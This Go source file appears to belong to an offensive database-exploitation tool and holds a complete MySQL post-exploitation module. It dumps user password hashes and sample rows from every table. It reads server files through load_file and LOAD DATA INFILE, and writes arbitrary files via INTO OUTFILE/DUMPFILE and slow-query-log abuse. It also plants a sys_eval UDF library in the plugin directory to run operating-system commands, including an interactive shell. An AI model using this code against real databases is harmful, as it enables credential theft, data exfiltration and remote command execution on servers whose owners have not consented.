package core

import (
	"davinci/common"
	"davinci/common/log"
	"davinci/core/mysql"
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/go-mysql-org/go-mysql/client"
	"strconv"
	"strings"
)

var excludeMysqlDB = []string{
	"information_schema",
	"mysql",
	"performance_schema",
	"sys",
}

type Mysql struct {
	conn   *client.Conn
	Host   string
	Port   int
	User   string
	Passwd string
	DbName string
	Cmd    string
}

func (m *Mysql) connect() error {
	var err error
	if m.conn == nil {

		addr := fmt.Sprintf("%s:%d", m.Host, m.Port)
		log.Info("connecting target...")
		if m.conn, err = client.Connect(addr, m.User, m.Passwd, m.DbName); err != nil {
			log.Error(err)
		}
	}
	return err
}

func (m *Mysql) Close() {
	if m.conn != nil {
		m.conn.Close()
	}
}

func (m *Mysql) ExecuteOnce() {
	if m.connect() != nil {
		return
	}

	result := m.execute(m.Cmd)
	log.Output(result)
}

func (m *Mysql) AutoGather() {
	if m.connect() != nil {
		return
	}

	log.Output(m.getVersion())
	log.Output(m.getUsers())
	databases := m.getDatabases()
	log.Output(databases)
	log.Info(fmt.Sprintf("exclude databbase(built-in): %s", strings.Join(excludeMysqlDB, ",")))
	for _, database := range common.GetColumnData(databases, 0) {
		if common.Contains(excludeMysqlDB, strings.ToLower(database)) {
			continue
		}
		tables := m.getTables(database)
		log.Output(tables)
		for _, table := range common.GetColumnData(tables, 0) {
			tableStruct := m.getTableStruct(database, table)
			log.Output(tableStruct)
			dataSum := m.getSumRows(database, table)
			log.Output(dataSum)
			datas := m.getFirst5Rows(database, table)
			log.Output(datas)
		}
	}
	m.getSecFilePriv()
	m.getPluginDir()
}

func (m *Mysql) Shell() {

	if m.connect() != nil {
		return
	}
	sqlShell(m.execute)
}

func (m *Mysql) SetHost(host string) {
	m.Host = host
}
func (m *Mysql) SetPort(port int) {
	m.Port = port
}

func (m *Mysql) SetCmd(cmd string) {
	m.Cmd = cmd
}

func (m *Mysql) execute(cmd string) (result [][]string) {
	if m.conn == nil {
		log.Warn("please connect mysql first")
		return nil
	}
	var rowNum int
	var columnNum int
	defer func() {
		err := recover()
		if err != nil && err.(error).Error() == "runtime error: invalid memory address or nil pointer dereference" {
			result = make([][]string, 0)
		}
	}()
	log.Info("execute sql: " + cmd)
	r, err := m.conn.Execute(cmd)
	if err != nil {
		log.Error(err)
		return nil
	}
	rowNum = r.RowNumber()
	columnNum = r.ColumnNumber()
	result = make([][]string, rowNum+1)
	result[0] = make([]string, columnNum)
	for j := 0; j < columnNum; j++ {
		result[0][j] = string(r.Fields[j].Name)
	}

	for i := 0; i < rowNum; i++ {
		result[i+1] = make([]string, columnNum)
		for j := 0; j < columnNum; j++ {
			val, _ := r.GetString(i, j)
			result[i+1][j] = val
		}
	}
	return result
}

func (m *Mysql) getDatabases() [][]string {
	sql := "show databases;"
	log.Info("get databases")
	return m.execute(sql)
}

func (m *Mysql) getTables(dbName string) [][]string {
	sql := fmt.Sprintf("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='%s';", dbName)
	log.Info(fmt.Sprintf("get tables in %s ", dbName))
	return m.execute(sql)
}

func (m *Mysql) getColumns(dbName, tbName string) [][]string {
	sql := fmt.Sprintf("SELECT COLUMN_NAME,COLUMN_TYPE FROM INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA='%s' and TABLE_NAME = '%s';", dbName, tbName)
	return m.execute(sql)
}

func (m *Mysql) getTableStruct(dbName, tbName string) [][]string {
	sql := fmt.Sprintf("DESC %s.%s;", dbName, tbName)
	log.Info(fmt.Sprintf("get table [%s] struct", tbName))
	return m.execute(sql)
}

func (m *Mysql) getSumRows(dbName, tbName string) [][]string {
	sql := fmt.Sprintf("select TABLE_ROWS FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='%s' and TABLE_NAME='%s';", dbName, tbName)
	log.Info(fmt.Sprintf("get total number of rows in table [%s]", tbName))
	return m.execute(sql)
}

func (m *Mysql) getFirst5Rows(dbName, tbName string) [][]string {
	sql := fmt.Sprintf("select * from %s.%s limit 5;", dbName, tbName)
	log.Info(fmt.Sprintf("get first 5 rows in table [%s]", tbName))
	return m.execute(sql)
}

func (m *Mysql) getUsers() [][]string {
	data := m.execute("select count(*) from information_schema.columns where table_schema = 'mysql'" +
		" and table_name = 'user' and column_name = 'password'")
	// 不同版本的密码字段不同
	if data != nil {
		exist := data[1][0]
		var sql string
		if exist == "1" {
			sql = "select user,host,password from mysql.user;"
		} else {
			sql = "select user,host,authentication_string from mysql.user;"
		}

		log.Info("get users")
		return m.execute(sql)
	} else {
		log.Warn("can't find mysql.user")
		return nil
	}
}

func (m *Mysql) getVersion() [][]string {
	sql := fmt.Sprintf("select version(),@@version_compile_os,@@version_compile_machine;")
	log.Info(fmt.Sprintf("get version"))
	return m.execute(sql)
}

func (m *Mysql) getSecFilePriv() string {
	sql := "select @@secure_file_priv"
	if result := m.execute(sql); result != nil {
		log.Output(result)
		return result[1][0]
	} else {
		log.Warn("get secure_file_priv err")
		return "secure_file_priv_err"
	}
}

func (m *Mysql) getPluginDir() string {
	sql := "select @@plugin_dir"
	if result := m.execute(sql); result != nil {
		log.Output(result)
		return result[1][0]
	} else {
		log.Info("get plugin_dir err")
		return "plugin_dir_err"
	}
}

func (m *Mysql) WriteFile_by_IntoSql(hex, path string, flag bool) bool {
	if m.connect() != nil {
		return false
	}
	var sql string
	if !strings.HasPrefix(hex, "0x") {
		hex = "0x" + hex
	}
	if flag {
		log.Info("write file by outfile")
		sql = fmt.Sprintf("select %s into outfile '%s'", hex, path)
	} else {
		log.Info("write file by dumpfile")
		sql = fmt.Sprintf("select %s into dumpfile '%s'", hex, path)
	}
	if result := m.execute(sql); result != nil {
		log.Info("write success")
		return true
	} else {
		sfp := m.getSecFilePriv()
		if sfp == "NULL" {
			log.Info("secure_file_priv=null not support write file")
		} else {
			log.Info("maybe target path is not in secure_file_priv")
		}
		return false
	}
}

func (m *Mysql) WriteFile_by_SlowQueryLog(content, path string) bool {
	if m.connect() != nil {
		return false
	}
	log.Info("write file by slow query log")
	sql1 := "show variables like '%slow_query_log%'"
	if info := m.execute(sql1); info != nil {
		log.Output(info)
		slow_query_log := info[1][1]
		slow_query_log_file := info[2][1]
		time := 11.00

		sql2 := "show global variables like '%long_query_time%'"
		if lqtRsp := m.execute(sql2); lqtRsp != nil {
			lqt := lqtRsp[1][0]
			if longtime, err := strconv.ParseFloat(lqt, 64); err == nil {
				time = longtime + 1.00
			}
		}

		sql3 := "set global slow_query_log=1"
		m.execute(sql3)
		sql4 := fmt.Sprintf("set global slow_query_log_file='%s'", path)
		m.execute(sql4)
		sql5 := fmt.Sprintf("select '%s' or sleep(%f);", strings.ReplaceAll(content, "'", "\\'"), time)
		result := m.execute(sql5)
		log.Output(result)

		sql6 := fmt.Sprintf("set global slow_query_log=%s", slow_query_log)
		m.execute(sql6)
		sql7 := fmt.Sprintf("set global slow_query_log_file='%s'", slow_query_log_file)
		m.execute(sql7)
		return true
	} else {
		log.Warn("get slow_query_log info err")
		return false
	}
}

func (m *Mysql) ReadFile_by_LoadData(path string, hex bool) (result string) {
	if m.connect() != nil {
		return
	}
	log.Info("[info] load file by load data infile")
	sfp := m.getSecFilePriv()
	if sfp == "NULL" {
		log.Warn("secure_file_priv=null not support write file")
		return
	} else if sfp == "" || strings.HasPrefix(path, sfp) {

		if m.DbName == "" {
			log.Info("not set current db, choose sys")
			m.DbName = "sys"
			m.execute(fmt.Sprintf("use %s", m.DbName))

		}
		tables := common.GetColumnData(m.getTables(m.DbName), 0)
		tableName := common.GetRandomAlapha(10)
		for common.Contains(tables, tableName) {
			tableName = common.GetRandomAlapha(10)
		}
		sql1 := fmt.Sprintf("CREATE TABLE %s(FIELDS TEXT);", tableName)
		m.execute(sql1)

		sql2 := fmt.Sprintf("load data infile '%s' into table %s  FIELDS TERMINATED BY '\\n'", path, tableName)
		m.execute(sql2)

		sql3 := fmt.Sprintf("select FIELDS from %s", tableName)
		if hex {
			sql3 = fmt.Sprintf("select hex(FIELDS) from %s", tableName)
		}
		res := m.execute(sql3)
		result = res[1][0]

		sql4 := fmt.Sprintf("drop table %s", tableName)
		m.execute(sql4)

	} else {
		log.Warn("load data infile is affected by @@secure_file_priv,can't load file")
	}
	return
}

func (m *Mysql) ReadFile_by_LoadFile(path string, hex bool) (result string) {
	if m.connect() != nil {
		return
	}
	var sql string
	log.Info("load file by loadfile()")
	if hex {
		sql = fmt.Sprintf("select hex(load_file('%s'));", path)
	} else {
		sql = fmt.Sprintf("select replace(load_file('%s'),'\\r','\\n');", path)
	}
	res := m.execute(sql)
	result = res[1][0]
	if result == "" {
		log.Warn("result is empty,may be restricted by secure_file_priv configuration. ")
	}
	return
}

func (m *Mysql) udfExist(name string) bool {
	var exist = false

	if funcsRsp := m.execute("select name from mysql.func;"); funcsRsp != nil {
		funcs := common.GetColumnData(funcsRsp, 0)
		for _, funcName := range funcs {
			if funcName == name {
				log.Info(fmt.Sprintf("udf %s already exist", name))
				exist = true
				break
			}
		}
	}
	return exist
}

func (m *Mysql) createUdf() bool {
	var exist = m.udfExist("sys_eval")

	// 不存在则尝试创建
	if !exist {
		log.Info("start create udf")
		defer func() {
			err := recover()
			if err != nil {
				log.Warn(err)
			}
		}()
		info := m.execute("select @@plugin_dir,version(),@@version_compile_os,@@version_compile_machine;")
		pluginDir := info[1][0]
		version := info[1][1]
		os := info[1][2]
		platform := info[1][3]
		udf := mysql.GetMysqlUdf(os, platform)
		if udf == "" {
			return false
		}

		ext := "so"
		if strings.HasPrefix(os, "win") {
			ext = "dll"
		}

		if pluginDir == "" {
			log.Warn("plugin_dir is empty")
			// windowns 平台有默认路径
			if strings.HasPrefix(os, "win") {

				if common.CompareVersion("5.0", version, ".") {
					// version < 5.0
					pluginDir = "C:\\Windows\\"
				} else if common.CompareVersion("5.1", version, ".") {
					// 5.0 <= version  < 5.1
					pluginDir = "C:\\Windows\\System32\\"
				} else {
					return false
				}
			} else {
				return false
			}
		}
		if strings.HasPrefix(os, "lin") && !strings.HasSuffix(pluginDir, "/") {
			pluginDir += "/"
		} else if strings.HasPrefix(os, "win") && !strings.HasSuffix(pluginDir, "\\") {
			pluginDir += "\\"
		}
		fileName := fmt.Sprintf("mysql_udf_%s.%s", common.GetRandomString(5), ext)
		fullPath := fmt.Sprintf("%s%s", pluginDir, fileName)
		success := m.WriteFile_by_IntoSql(udf, fullPath, false)
		if success {
			log.Info("write udf success")
			creatUdf := fmt.Sprintf("create function sys_eval returns string soname '%s'", fileName)
			if m.execute(creatUdf) != nil {
				log.Info("create udf success")
				exist = true
			} else {
				log.Warn("create udf fail")
			}

		} else {
			log.Warn("write udf fail")
		}
	}
	return exist
}

func (m *Mysql) UdfExecOsShell(cmd string, interactive bool) {
	if m.connect() != nil {
		return
	}

	if m.createUdf() {
		if interactive {
			pmt := prompt.New(func(in string) {},
				func(document prompt.Document) []prompt.Suggest {
					return nil
				})

			for {
				in := pmt.Input()
				if strings.EqualFold(in, "exit") || strings.EqualFold(in, "exit()") {
					break
				}
				if strings.Trim(in, " ") == "" {
					continue
				}
				m.udfExec(in)
			}
		} else {
			m.udfExec(cmd)
		}
	}
}

func (m *Mysql) udfExec(cmd string) {
	sql := fmt.Sprintf("select sys_eval('%s');", cmd)
	if result := m.execute(sql); result != nil {
		for _, out := range result[1:] {
			log.Output(out[0])
		}
	}
}
